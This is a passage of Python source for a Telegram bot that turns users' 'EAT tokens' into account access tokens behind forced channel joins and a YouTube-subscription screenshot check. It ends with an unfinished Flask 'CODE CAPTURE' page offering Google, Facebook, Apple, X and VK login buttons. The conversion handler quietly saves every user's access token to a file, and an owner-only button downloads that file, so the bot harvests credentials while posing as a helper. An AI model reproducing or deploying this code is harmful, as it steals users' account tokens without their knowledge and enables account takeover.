        await update.message.reply_text(
            "ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.",
            reply_to_message_id=mid,
        )
        return
    if not await is_member_all(context.bot, user.id):
        await update.message.reply_text(
            FORCE_JOIN_TEXT,
            parse_mode="HTML",
            reply_markup=force_join_kb(),
            reply_to_message_id=mid,
        )
        return
    if not is_yt_verified_today(user.id) and user.id != OWNER_ID:
        await update.message.reply_text(
            YT_PROMPT,
            parse_mode="HTML",
            reply_markup=yt_verify_kb(),
            reply_to_message_id=mid,
        )
        return
    await update.message.reply_text(
        welcome_text(first_name),
        parse_mode="HTML",
        reply_markup=WELCOME_HOWTO_KB,
        reply_to_message_id=mid,
        disable_web_page_preview=True,
    )
    await update.message.reply_text(
        "ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ:",
        reply_markup=main_kb(user.id == OWNER_ID),
    )


async def check_joined(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    q = update.callback_query
    if not q or not q.from_user:
        return
    await q.answer()
    user = q.from_user
    upsert_user(user)
    missing = await missing_chats(context.bot, user.id)
    if missing:
        await q.edit_message_text(
            FORCE_JOIN_TEXT,
            parse_mode="HTML",
            reply_markup=force_join_kb(),
        )
        return
    if not is_yt_verified_today(user.id) and user.id != OWNER_ID:
        await q.edit_message_text(
            YT_PROMPT,
            parse_mode="HTML",
            reply_markup=yt_verify_kb(),
        )
        return
    await q.edit_message_text("ᴀʟʟ ᴊᴏɪɴs ᴠᴇʀɪꜰɪᴇᴅ.")
    if update.effective_chat:
        first_name = escape(user.first_name or "User")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=welcome_text(first_name),
            parse_mode="HTML",
            reply_markup=WELCOME_HOWTO_KB,
            disable_web_page_preview=True,
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ:",
            reply_markup=main_kb(user.id == OWNER_ID),
        )


async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    if not update.message or not update.message.photo or not update.effective_user:
        return
    user = update.effective_user
    upsert_user(user)
    photo_msg = update.message
    mid = photo_msg.message_id
    if is_banned(user.id) and user.id != OWNER_ID:
        await photo_msg.reply_text("ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ.", reply_to_message_id=mid)
        return
    if is_maintenance() and user.id != OWNER_ID:
        await photo_msg.reply_text(
            "ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.", reply_to_message_id=mid
        )
        return
    if not await is_member_all(context.bot, user.id):
        await photo_msg.reply_text(
            FORCE_JOIN_TEXT,
            parse_mode="HTML",
            reply_markup=force_join_kb(),
            reply_to_message_id=mid,
        )
        return
    if is_yt_verified_today(user.id) and user.id != OWNER_ID:
        await photo_msg.reply_text(
            "ʏᴏᴜᴛᴜʙᴇ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜰᴏʀ ᴛᴏᴅᴀʏ ɪs ᴀʟʀᴇᴀᴅʏ ᴄᴏᴍᴘʟᴇᴛᴇ.",
            reply_markup=main_kb(False),
            reply_to_message_id=mid,
        )
        try:
            await photo_msg.delete()
        except Exception:
            pass
        return
    status = await photo_msg.reply_text(
        "<i>ᴠᴇʀɪꜰʏɪɴɢ ʏᴏᴜᴛᴜʙᴇ sᴜʙsᴄʀɪᴘᴛɪᴏɴ...</i>",
        parse_mode="HTML",
        reply_to_message_id=mid,
    )
    temp_path = None
    try:
        photo = photo_msg.photo[-1]
        tg_file = await context.bot.get_file(photo.file_id)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
            temp_path = tmp.name
        await tg_file.download_to_drive(custom_path=temp_path)
        loop = asyncio.get_event_loop()
        text = await loop.run_in_executor(executor, extract_text, temp_path)
        try:
            await photo_msg.delete()
        except Exception:
            pass
        if not text:
            await status.edit_text(
                "<i>ᴄᴏᴜʟᴅ ɴᴏᴛ ᴠᴇʀɪꜰʏ. ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴄʟᴇᴀʀ sᴄʀᴇᴇɴsʜᴏᴛ.</i>",
                parse_mode="HTML",
            )
            return
        verified, details = verify_screenshot(text)
        if verified:
            set_yt_verified(user.id)
            await status.edit_text(
                "<b>ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇssꜰᴜʟ</b>\n\n"
                "<b>ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:</b> Krishna Coder\n"
                "<b>sᴜʙsᴄʀɪᴘᴛɪᴏɴ sᴛᴀᴛᴜs:</b> Subscribed\n\n"
                "<i>ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴛʜᴇ ʙᴏᴛ ɴᴏᴡ.</i>",
                parse_mode="HTML",
            )
            first_name = escape(user.first_name or "User")
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=welcome_text(first_name),
                parse_mode="HTML",
                reply_markup=WELCOME_HOWTO_KB,
                disable_web_page_preview=True,
            )
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ:",
                reply_markup=main_kb(user.id == OWNER_ID),
            )
        else:
            await status.edit_text(
                "<b>ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜰᴀɪʟᴇᴅ</b>\n\n"
                f"<b>ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:</b> Krishna Coder\n"
                f"<b>sᴜʙsᴄʀɪᴘᴛɪᴏɴ sᴛᴀᴛᴜs:</b> "
                f"{'Subscribed' if details['subscribed'] else 'Failed'}\n\n"
                "<i>sᴇɴᴅ ᴀ ᴄʟᴇᴀʀ sᴄʀᴇᴇɴsʜᴏᴛ.</i>",
                parse_mode="HTML",
                reply_markup=yt_verify_kb(),
            )
    except Exception as e:
        logger.exception(f"Photo error: {e}")
        try:
            await status.edit_text("ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴇʀʀᴏʀ. ᴛʀʏ ᴀɢᴀɪɴ.")
        except Exception:
            pass
        try:
            await photo_msg.delete()
        except Exception:
            pass
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except Exception:
                pass


async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    if not update.message or not update.effective_user:
        return ConversationHandler.END
    if not await gate_checks(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        "ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ.\n\n"
        "📝 sᴇɴᴅ ʏᴏᴜʀ ᴇᴀᴛ ᴛᴏᴋᴇɴ ʙᴇʟᴏᴡ:\n\n"
        "⚠️ ᴛʏᴘᴇ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ.",
        reply_to_message_id=update.message.message_id,
        reply_markup=WELCOME_HOWTO_KB,
    )
    return WAITING_CODE


async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    if not update.message or not update.effective_user:
        return ConversationHandler.END
    user = update.effective_user
    if not await gate_checks(update, context):
        return ConversationHandler.END
    code = (update.message.text or "").strip()
    mid = update.message.message_id
    buttons = {
        "ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ",
        "sᴛᴀᴛᴜs",
        "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        "ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ",
    }
    if not code or code in buttons or len(code) < 10:
        await update.message.reply_text(
            "ɪɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ. /cancel ᴛᴏ sᴛᴏᴘ.",
            reply_to_message_id=mid,
        )
        return WAITING_CODE
    status = await update.message.reply_text(
        "<i>ɢᴇɴᴇʀᴀᴛɪɴɢ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</i>...",
        reply_to_message_id=mid,
        parse_mode="HTML",
    )
    try:
        await update.message.delete()
    except Exception:
        pass
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(executor, process_code_sync, code)
    if result.get("success") and result.get("access_token"):
        save_access_token(result["access_token"])
        inc_success(user.id)
        body = format_success_response(result)
        await status.edit_text(body, reply_markup=WELCOME_HOWTO_KB, parse_mode="HTML")
    else:
        inc_failed(user.id)
        await status.edit_text(
            "ꜰᴀɪʟᴇᴅ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ. ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴇᴀᴛ ᴛᴏᴋᴇɴ."
        )
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    if update.message:
        await update.message.reply_text(
            "ᴄᴀɴᴄᴇʟʟᴇᴅ.",
            reply_to_message_id=update.message.message_id,
            reply_markup=main_kb(
                update.effective_user and update.effective_user.id == OWNER_ID
            ),
        )
    return ConversationHandler.END


async def status_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    if not update.message or not update.effective_user:
        return
    if not await gate_checks(update, context):
        return
    user = update.effective_user
    mid = update.message.message_id
    st = get_user_stats(user.id) or {
        "first_name": user.first_name or "",
        "username": user.username or "",
        "total_success": 0,
        "total_failed": 0,
    }
    g_ok, g_fail, g_users = global_stats()
    name = escape(st["first_name"] or user.first_name or "-")
    uname = st["username"] or user.username or "-"
    if uname and not str(uname).startswith("@"):
        uname = f"@{uname}"
    uname = escape(str(uname))
    text = (
        "┌ <b>sᴛᴀᴛᴜs</b>\n"
        f"├ ɴᴀᴍᴇ: <b>{name}</b>\n"
        f"├ ᴜsᴇʀɴᴀᴍᴇ: <b>{uname}</b>\n"
        f"├ ᴜsᴇʀ ɪᴅ: <code>{user.id}</code>\n"
        "├──────────────\n"
        f"├ sᴜᴄᴄᴇss: <b>{st['total_success']}</b>\n"
        f"├ ꜰᴀɪʟᴇᴅ: <b>{st['total_failed']}</b>\n"
        "├──────────────\n"
        f"└ ᴛᴏᴛᴀʟ ᴜsᴇʀs: <b>{g_users}</b>"
    )
    try:
        photos = await context.bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            file_id = photos.photos[0][-1].file_id
            await update.message.reply_photo(
                photo=file_id,
                caption=text,
                parse_mode="HTML",
                reply_to_message_id=mid,
                reply_markup=WELCOME_HOWTO_KB,
            )
            return
    except Exception:
        pass
    await update.message.reply_text(
        text, parse_mode="HTML", reply_to_message_id=mid
    )


async def developer_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    if not update.message:
        return
    if not await gate_checks(update, context):
        return
    await update.message.reply_text(
        "┌ <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ</b>\n"
        f"├ ᴛᴇʟᴇɢʀᴀᴍ: {DEV_USERNAME}\n"
        "├ ʏᴏᴜᴛᴜʙᴇ: @KrishnaCoderOfficial\n"
        f"├ ᴄʜᴀɴɴᴇʟ: {CHANNEL_USERNAME}\n"
        f"├ ᴄʜᴀɴɴᴇʟ: {CHANNEL_2}\n"
        f"└ ɢʀᴏᴜᴘ: {GROUP_USERNAME}",
        parse_mode="HTML",
        reply_to_message_id=update.message.message_id,
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("ʏᴏᴜᴛᴜʙᴇ", url=YT_CHANNEL_URL)],
                [
                    InlineKeyboardButton(
                        "ᴄʜᴀɴɴᴇʟ",
                        url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "ᴄʜᴀɴɴᴇʟ",
                        url=f"https://t.me/{CHANNEL_2.lstrip('@')}",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ",
                        url=f"https://t.me/{GROUP_USERNAME.lstrip('@')}",
                    )
                ],
            ]
        ),
    )


async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    if not update.message or not update.effective_user:
        return
    if update.effective_user.id != OWNER_ID:
        return
    g_ok, g_fail, g_users = global_stats()
    maint = "ON" if is_maintenance() else "OFF"
    await update.message.reply_text(
        "┌ <b>ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n"
        f"├ ᴜsᴇʀs: <b>{g_users}</b>\n"
        f"├ sᴜᴄᴄᴇss: <b>{g_ok}</b>\n"
        f"├ ꜰᴀɪʟᴇᴅ: <b>{g_fail}</b>\n"
        f"└ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: <b>{maint}</b>",
        parse_mode="HTML",
        reply_to_message_id=update.message.message_id,
        reply_markup=owner_kb(),
    )


async def owner_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    q = update.callback_query
    if not q or not q.from_user or q.from_user.id != OWNER_ID:
        if q:
            await q.answer("Owner only", show_alert=True)
        return ConversationHandler.END
    await q.answer()
    data = q.data or ""
    if data == "owner_close":
        await q.edit_message_text("ᴄʟᴏsᴇᴅ.")
        return ConversationHandler.END
    if data == "owner_users":
        await q.edit_message_text(
            f"ᴛᴏᴛᴀʟ ᴜsᴇʀs: <b>{total_users()}</b>", parse_mode="HTML"
        )
        return ConversationHandler.END
    if data == "owner_maint_toggle":
        now = not is_maintenance()
        set_maintenance(now)
        await q.edit_message_text(
            f"ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: <b>{'ON' if now else 'OFF'}</b>",
            parse_mode="HTML",
            reply_markup=owner_kb(),
        )
        return ConversationHandler.END
    if data == "owner_download_tokens":
        if not os.path.exists(ACCESS_TOKEN_JSON):
            await q.edit_message_text("ɴᴏ ᴛᴏᴋᴇɴ ꜰɪʟᴇ ꜰᴏᴜɴᴅ.")
            return ConversationHandler.END
        try:
            with open(ACCESS_TOKEN_JSON, "rb") as f:
                await context.bot.send_document(
                    chat_id=q.from_user.id,
                    document=InputFile(f, filename="access_token.json"),
                    caption="access_token.json",
                )
            await q.answer("File sent")
        except Exception as e:
            await q.edit_message_text(f"Download failed: {e}")
        return ConversationHandler.END
    if data == "owner_ban":
        await q.edit_message_text("sᴇɴᴅ ᴜsᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ:")
        return WAITING_BAN
    if data == "owner_unban":
        await q.edit_message_text("sᴇɴᴅ ᴜsᴇʀ ɪᴅ ᴛᴏ ᴜɴʙᴀɴ:")
        return WAITING_UNBAN
    if data == "owner_broadcast":
        await q.edit_message_text("sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ:")
        return WAITING_BROADCAST
    return ConversationHandler.END


async def handle_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    if not update.message or update.effective_user.id != OWNER_ID:
        return ConversationHandler.END
    text = (update.message.text or "").strip()
    if not text.isdigit():
        await update.message.reply_text(
            "ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ.",
            reply_to_message_id=update.message.message_id,
        )
        return WAITING_BAN
    uid = int(text)
    set_ban(uid, True)
    await update.message.reply_text(
        f"ʙᴀɴɴᴇᴅ: <code>{uid}</code>",
        parse_mode="HTML",
        reply_to_message_id=update.message.message_id,
    )
    return ConversationHandler.END


async def handle_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    if not update.message or update.effective_user.id != OWNER_ID:
        return ConversationHandler.END
    text = (update.message.text or "").strip()
    if not text.isdigit():
        await update.message.reply_text(
            "ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ.",
            reply_to_message_id=update.message.message_id,
        )
        return WAITING_UNBAN
    uid = int(text)
    set_ban(uid, False)
    await update.message.reply_text(
        f"ᴜɴʙᴀɴɴᴇᴅ: <code>{uid}</code>",
        parse_mode="HTML",
        reply_to_message_id=update.message.message_id,
    )
    return ConversationHandler.END


async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return ConversationHandler.END
    if not update.message or update.effective_user.id != OWNER_ID:
        return ConversationHandler.END
    text = update.message.text or ""
    if not text.strip():
        await update.message.reply_text(
            "ᴇᴍᴘᴛʏ ᴍᴇssᴀɢᴇ.",
            reply_to_message_id=update.message.message_id,
        )
        return WAITING_BROADCAST
    ids = all_chat_ids()
    ok = fail = 0
    status = await update.message.reply_text(
        f"sᴇɴᴅɪɴɢ ᴛᴏ {len(ids)} ᴜsᴇʀs...",
        reply_to_message_id=update.message.message_id,
    )
    for cid in ids:
        try:
            await context.bot.send_message(chat_id=cid, text=text)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await status.edit_text(f"sᴇɴᴛ: {ok}\nꜰᴀɪʟᴇᴅ: {fail}")
    return ConversationHandler.END


async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_blocked_group(update):
        return
    if not update.message or not update.message.text:
        return
    t = update.message.text.strip()
    user = update.effective_user
    if t == "sᴛᴀᴛᴜs":
        await status_handler(update, context)
    elif t == "ᴅᴇᴠᴇʟᴏᴘᴇʀ":
        await developer_handler(update, context)
    elif t == "ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ" and user and user.id == OWNER_ID:
        await owner_panel(update, context)
    elif t == "ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ":
        return
    else:
        if await gate_checks(update, context):
            await update.message.reply_text(
                "ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ꜰʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ.",
                reply_to_message_id=update.message.message_id,
                reply_markup=main_kb(user and user.id == OWNER_ID),
            )


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    if isinstance(err, (BadRequest, TimedOut, NetworkError, Forbidden)):
        logger.warning(f"TG error: {err}")
        return
    logger.exception("Unhandled error:", exc_info=err)


# ─────────────────────── WEB (eat website) ───────────────────────
web_app = Flask(__name__)


@web_app.route("/")
def home():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width, initial-scale=1.0,
      maximum-scale=1.0, user-scalable=no">

<meta name="theme-color" content="#03040b">
<meta name="description" content="Eat Token • Secure • Smart • Seamless">

<title>Eat Token • Krishna Coder</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    -webkit-tap-highlight-color:transparent;
}

html,body{
    width:100%;
    min-height:100%;
}

body{
    min-height:100vh;
    overflow-x:hidden;
    background:#03040b;
    color:#fff;
    font-family:Inter,Arial,sans-serif;
}

/* ================= BACKGROUND ================= */

body::before{
    content:"";
    position:fixed;
    inset:0;
    pointer-events:none;
    background:
        radial-gradient(
            circle at 10% 0%,
            rgba(87,58,255,.24),
            transparent 27%
        ),
        radial-gradient(
            circle at 100% 38%,
            rgba(65,60,255,.18),
            transparent 29%
        ),
        radial-gradient(
            circle at 50% 100%,
            rgba(166,43,255,.10),
            transparent 35%
        );
    z-index:-3;
}

.bg-orb{
    position:fixed;
    border-radius:50%;
    pointer-events:none;
    filter:blur(1px);
    z-index:-2;
}

.orb-left{
    width:390px;
    height:390px;
    top:-210px;
    left:-120px;
    border:1px solid rgba(96,87,255,.55);
    box-shadow:
        0 0 80px rgba(81,65,255,.22),
        inset 0 0 60px rgba(81,65,255,.12);
}

.orb-right{
    width:430px;
    height:430px;
    top:170px;
    right:-300px;
    border:1px solid rgba(91,70,255,.42);
    box-shadow:
        0 0 100px rgba(77,62,255,.18),
        inset 0 0 80px rgba(77,62,255,.08);
}

.noise{
    position:fixed;
    inset:0;
    pointer-events:none;
    z-index:-1;
    opacity:.025;
    background-image:
        url("data:image/svg+xml,%3Csvg viewBox='0 0 180 180' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.8' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.8'/%3E%3C/svg%3E");
}

/* ================= MAIN ================= */

.container{
    width:100%;
    max-width:900px;
    margin:auto;
    padding:45px 22px 32px;
}

/* ================= BRAND ================= */

.brand{
    text-align:center;
}

.logo{
    width:92px;
    height:92px;
    margin:0 auto 25px;
    border-radius:50%;

    display:flex;
    align-items:center;
    justify-content:center;

    font-size:35px;
    font-weight:700;
    letter-spacing:-3px;

    background:
        linear-gradient(
            145deg,
            #c76cff,
            #765cff 45%,
            #35d7ff
        );

    color:transparent;
    -webkit-background-clip:text;
    background-clip:text;

    border:1px solid rgba(145,112,255,.65);

    box-shadow:
        0 0 35px rgba(111,76,255,.25),
        inset 0 0 25px rgba(255,255,255,.04);

    position:relative;
}

.logo::before{
    content:"";
    position:absolute;
    inset:-1px;
    border-radius:50%;
    border:1px solid rgba(88,184,255,.35);
}

.logo::after{
    content:"✦";
    position:absolute;
    right:-3px;
    top:0;
    font-size:14px;
    color:#fff;
    text-shadow:0 0 15px #fff;
}

.brand h1{
    font-size:46px;
    font-weight:600;
    letter-spacing:10px;
    margin-left:10px;
}

.brand-sub{
    margin-top:14px;
    color:#a39fc9;
    font-size:15px;
    letter-spacing:6px;
}

.gradient-line{
    width:115px;
    height:3px;
    margin:26px auto 28px;
    border-radius:10px;
    background:linear-gradient(
        90deg,
        transparent,
        #d35cff,
        #40bfff,
        transparent
    );
    box-shadow:
        0 0 14px rgba(128,83,255,.8);
}

/* ================= STATUS ================= */

.status{
    width:max-content;
    margin:0 auto 32px;

    display:flex;
    align-items:center;
    gap:12px;

    padding:10px 19px;
    border-radius:30px;

    background:rgba(12,14,32,.58);
    border:1px solid rgba(111,100,220,.25);

    color:#d1cde3;
    font-size:13px;
    letter-spacing:.4px;

    box-shadow:
        0 0 25px rgba(55,45,150,.12),
        inset 0 1px rgba(255,255,255,.04);
}

.status-dot{
    width:10px;
    height:10px;
    border-radius:50%;
    background:#39e982;
    box-shadow:
        0 0 8px #39e982,
        0 0 18px rgba(57,233,130,.7);
}

/* ================= LOGIN CARD ================= */

.card{
    max-width:730px;
    margin:auto;
    padding:38px 50px 40px;

    border-radius:34px;

    background:
        linear-gradient(
            145deg,
            rgba(14,16,38,.80),
            rgba(7,9,22,.73)
        );

    border:1px solid rgba(119,107,218,.42);

    box-shadow:
        0 35px 100px rgba(0,0,0,.42),
        0 0 70px rgba(67,50,180,.08),
        inset 0 1px 0 rgba(255,255,255,.05);

    backdrop-filter:blur(25px);
    -webkit-backdrop-filter:blur(25px);
}

.security-icon{
    width:88px;
    height:88px;
    margin:0 auto 20px;

    display:flex;
    align-items:center;
    justify-content:center;

    font-size:40px;

    color:#73bfff;

    border:2px solid transparent;
    border-radius:25px;

    background:
        linear-gradient(#11142e,#11142e) padding-box,
        linear-gradient(
            145deg,
            #d75cff,
            #5c8dff,
            #25dfff
        ) border-box;

    box-shadow:
        0 0 35px rgba(120,80,255,.18);
}

.card-title{
    text-align:center;
    font-size:32px;
    font-weight:500;
    letter-spacing:-.8px;
}

.card-subtitle{
    text-align:center;
    color:#aaa6ca;
    margin-top:9px;
    margin-bottom:29px;
    font-size:15px;
}

/* ================= LOGIN BUTTON ================= */

.login-btn{
    width:100%;
    min-height:76px;
    margin-bottom:14px;

    padding:12px 19px;

    display:flex;
    align-items:center;
    gap:18px;

    border-radius:22px;

    background:
        linear-gradient(
            100deg,
            rgba(31,31,72,.74),
            rgba(16,18,44,.62)
        );

    border:1px solid rgba(113,107,187,.30);

    color:#fff;

    cursor:pointer;
    text-align:left;

    position:relative;
    overflow:hidden;

    transition:
        transform .22s ease,
        border-color .22s ease,
        box-shadow .22s ease,
        background .22s ease;
}

.login-btn::before{
    content:"";
    position:absolute;
    left:0;
    top:0;
    bottom:0;
    width:3px;

    background:linear-gradient(
        180deg,
        #d65cff,
        #5d7dff
    );

    box-shadow:0 0 18px #875cff;
}

.login-btn:hover{
    transform:translateY(-2px);
    border-color:rgba(147,124,255,.62);
    box-shadow:
        0 12px 35px rgba(0,0,0,.25),
        0 0 25px rgba(105,76,255,.10);
}

.login-btn:active{
    transform:scale(.985);
}

.provider-icon{
    width:50px;
    height:50px;
    min-width:50px;

    border-radius:50%;

    display:flex;
    align-items:center;
    justify-content:center;

    background:#161a38;

    border:1px solid rgba(255,255,255,.08);

    font-size:22px;
    font-weight:600;

    box-shadow:
        inset 0 0 15px rgba(255,255,255,.03);
}

.google .provider-icon{
    color:#fff;
    font-weight:700;
}

.facebook .provider-icon{
    color:#4d9cff;
}

.apple .provider-icon{
    color:#fff;
}

.x .provider-icon{
    color:#fff;
}

.vk .provider-icon{
    color:#62aaff;
    font-size:17px;
}

.login-text{
    flex:1;
}

.login-text strong{
    display:block;
    font-size:16px;
    font-weight:500;
}

.login-text span{
    display:block;
    margin-top:5px;
    color:#8885aa;
    font-size:11px;
}

.arrow{
    font-size:28px;
    color:#69668e;
    font-weight:300;
    transition:.2s;
}

.login-btn:hover .arrow{
    color:#bca8ff;
    transform:translateX(3px);
}

/* ================= SECURITY NOTE ================= */

.note{
    margin-top:25px;
    padding:18px 20px;

    display:flex;
    gap:13px;
    align-items:flex-start;

    border-radius:20px;

    background:rgba(27,26,58,.42);
    border:1px solid rgba(111,105,181,.19);

    color:#9693b7;
    font-size:12px;
    line-height:1.6;
}

.note-icon{
    width:27px;
    height:27px;
    min-width:27px;

    display:flex;
    align-items:center;
    justify-content:center;

    border:1px solid #986cff;
    border-radius:50%;

    color:#bd91ff;
}

/* ================= SOCIAL ================= */

.social-card{
    max-width:850px;
    margin:60px auto 0;

    padding:23px 28px;

    border-radius:24px;

    background:rgba(12,14,31,.67);
    border:1px solid rgba(105,99,180,.25);

    display:flex;
    align-items:center;
    gap:22px;

    box-shadow:
        0 20px 60px rgba(0,0,0,.25),
        inset 0 1px rgba(255,255,255,.03);
}

.youtube-box{
    width:55px;
    height:55px;
    min-width:55px;

    border-radius:16px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:#ff1748;

    box-shadow:
        0 0 25px rgba(255,23,72,.22);
}

.youtube-box::after{
    content:"▶";
    font-size:20px;
    color:#fff;
    margin-left:3px;
}

.social-info{
    flex:1;
}

.social-info strong{
    display:block;
    font-size:16px;
    font-weight:500;
}

.social-info span{
    display:block;
    color:#8582a5;
    margin-top:5px;
    font-size:12px;
}

.social-links{
    display:flex;
    gap:9px;
    flex-wrap:wrap;
    justify-content:flex-end;
}

.social-btn{
    text-decoration:none;
    color:#dddafa;

    padding:11px 15px;

    border-radius:14px;

    border:1px solid rgba(113,105,190,.27);
    background:rgba(255,255,255,.035);

    font-size:11px;

    transition:.2s;
}

.social-btn:hover{
    border-color:#896dff;
    background:rgba(120,88,255,.10);
    transform:translateY(-2px);
}

/* ================= FOOTER ================= */

footer{
    text-align:center;
    margin-top:34px;

    color:#67647f;
    font-size:11px;
    letter-spacing:.4px;
}

footer b{
    color:#9284c9;
}

/* ================= RESPONSIVE ================= */

@media(max-width:700px){

    .container{
        padding:32px 14px 25px;
    }

    .brand h1{
        font-size:29px;
        letter-spacing:6px;
    }

    .brand-sub{
        font-size:10px;
        letter-spacing:4px;
    }

    .logo{
        width:78px;
        height:78px;
        font-size:29px;
    }

    .card{
        padding:29px 16px 27px;
        border-radius:27px;
    }

    .security-icon{
        width:74px;
        height:74px;
        font-size:32px;
    }

    .card-title{
        font-size:25px;
    }

    .card-subtitle{
        font-size:12px;
    }

    .login-btn{
        min-height:68px;
        border-radius:19px;
        gap:13px;
        padding:10px 13px;
    }

    .provider-icon{
        width:45px;
        height:45px;
        min-width:45px;
    }

    .login-text strong{
        font-size:14px;
    }

    .login-text span{
        font-size:10px;
    }

    .social-card{
        margin-top:35px;
        padding:18px;
        flex-wrap:wrap;
    }

    .social-info{
        min-width:calc(100% - 80px);
    }

    .social-links{
        width:100%;
        justify-content:center;
    }

    .social-btn{
        flex:1;
        text-align:center;
    }
}

@media(max-width:380px){

    .brand h1{
        font-size:24px;
        letter-spacing:4px;
    }

    .card-title{
        font-size:22px;
    }

    .login-text span{
        display:none;
    }

    .social-btn{
        padding:10px 8px;
        font-size:10px;
    }
}
</style>
</head>

<body>

<div class="bg-orb orb-left"></div>
<div class="bg-orb orb-right"></div>
<div class="noise"></div>

<main class="container">

    <!-- BRAND -->
    <section class="brand">

        <div class="logo">KC</div>

        <h1>CODE CAPTURE</h1>

        <div class="brand-sub">
            Secure · Smart · Seamless
        </div>

        <div class="gradient-line"></div>

    </section>

    <!-- STATUS -->
    <div class="status">
        <span class="status-dot"></span>
        Secure Connection
    </div>

    <!-- LOGIN CARD -->
    <section class="card">

        <div class="security-icon">
            ♙
        </div>

        <h2 class="card-title">
            Choose Login Method
        </h2>

        <p class="card-subtitle">
